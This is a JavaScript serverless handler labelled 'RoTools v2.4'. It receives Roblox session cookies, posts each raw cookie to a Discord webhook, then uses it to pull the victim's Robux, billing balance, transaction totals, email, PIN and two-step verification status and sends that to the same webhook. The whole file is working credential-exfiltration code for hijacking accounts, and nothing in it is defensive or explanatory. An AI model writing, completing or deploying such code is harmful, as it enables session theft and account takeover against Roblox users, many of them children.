import fetch from 'node-fetch';

export default async function handler(req, res) {
  // Verify authorization
  if (req.headers.authorization !== 'Bearer secure-token-2025') {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie } = req.body;
    if (!cookie) {
      return res.status(400).json({ error: 'No cookie provided' });
    }

    // 1. Send raw cookie to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "🔐 Raw Cookie Received",
          description: `\`\`\`${cookie}\`\`\``,
          color: 0x3498db,
          footer: {
            text: "RoTools v2.4 | Raw Cookie"
          },
          timestamp: new Date().toISOString()
        }]
      })
    });

    // 2. Get account information
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    
    if (!userRes.ok || userRes.status === 401) {
      return res.json({ 
        success: false, 
        error: 'Invalid cookie - authentication failed'
      });
    }

    const userData = await userRes.json();
    const userId = userData.id;

    // Fetch all data in parallel
    const [
      robuxRes,
      creditRes,
      settingsRes,
      friendsRes,
      voiceRes,
      gamepassesRes,
      badgesRes,
      transactionsRes,
      thumbnailRes
    ] = await Promise.all([
      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://billing.roblox.com/v1/credit', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://www.roblox.com/my/settings/json', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://friends.roblox.com/v1/my/friends/count`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://voice.roblox.com/v1/settings', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId=${userId}`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://accountinformation.roblox.com/v1/users/${userId}/roblox-badges`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds=${userId}`)
    ]);

    // Parse responses
    const robuxData = await robuxRes.json();
    const creditData = await creditRes.json();
    const settingsData = await settingsRes.json();
    const friendsData = await friendsRes.json();
    const voiceData = await voiceRes.json();
    const gamepassesData = await gamepassesRes.text();
    const badgesData = await badgesRes.text();
    const transactionsData = await transactionsRes.json();
    const thumbnailData = await thumbnailRes.json();

    // Process data
    const account_gamepasses_worth = (gamepassesData.match(/"PriceInRobux":(\d+)/g) || [])
      .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);
    
    const account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
      .map(match => match.split('"')[3])
      .join(', ') || 'None';

    // Prepare full account information embed (like original Python)
    const accountInfoEmbed = {
      title: ":white_check_mark: Valid Cookie",
      description: "",
      color: 0x38d13b,
      thumbnail: { url: thumbnailData.data[0].imageUrl },
      fields: [
        { name: ":money_mouth: Robux", value: `${robuxData.robux}`, inline: true },
        { name: ":moneybag: Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
        { name: ":bust_in_silhouette: Account Name", 
          value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
        { name: ":email: Email", value: `${settingsData.IsEmailVerified}`, inline: true },
        { name: ":calendar: Account Age", 
          value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
        { name: ":baby: Above 13", value: `${settingsData.UserAbove13}`, inline: true },
        { name: ":star: Premium", value: `${settingsData.IsPremium}`, inline: true },
        { name: ":key: Has PIN", value: `${settingsData.IsAccountPinEnabled}`, inline: true },
        { name: ":lock: 2-Step Verification", 
          value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled || false}`, inline: true },
        { name: ":busts_in_silhouette: Friends", value: `${friendsData.count}`, inline: true },
        { name: ":microphone2: Voice Verified", value: `${voiceData.isVerifiedForVoice}`, inline: true },
        { name: ":video_game: Gamepasses Worth", 
          value: `${account_gamepasses_worth} R$`, inline: true },
        { name: ":medal: Badges", value: account_badges, inline: true },
        { name: "**↻** Transactions", 
          value: ":small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: ", 
          inline: false },
        { name: ":coin: Sales of Goods", value: `${transactionsData.salesTotal}`, inline: true },
        { name: "💰 Premium Payouts", value: `${transactionsData.premiumPayoutsTotal}`, inline: true },
        { name: "📈 Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
        { name: ":credit_card: Robux Purchased", 
          value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
        { name: "🚧 Pending", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
        { name: ":money_with_wings: Overall", 
          value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
      ],
      footer: {
        text: "RoTools v2.4 | Full Account Information"
      },
      timestamp: new Date().toISOString()
    };

    // Send full account information to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [accountInfoEmbed] })
    });

    return res.json({ success: true });
    
  } catch (error) {
    console.error('Server error:', error);
    
    // Send error notification to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: ":x: Processing Error",
          description: "An error occurred while processing the account information",
          color: 0xFF0000,
          fields: [{
            name: "Error Message",
            value: error.message || 'Unknown error'
          }],
          footer: {
            text: "RoTools v2.4 | Error Notification"
          },
          timestamp: new Date().toISOString()
        }]
      })
    });
    
    return res.status(500).json({ 
      success: false, 
      error: error.message || 'Internal server error' 
    });
  }
}
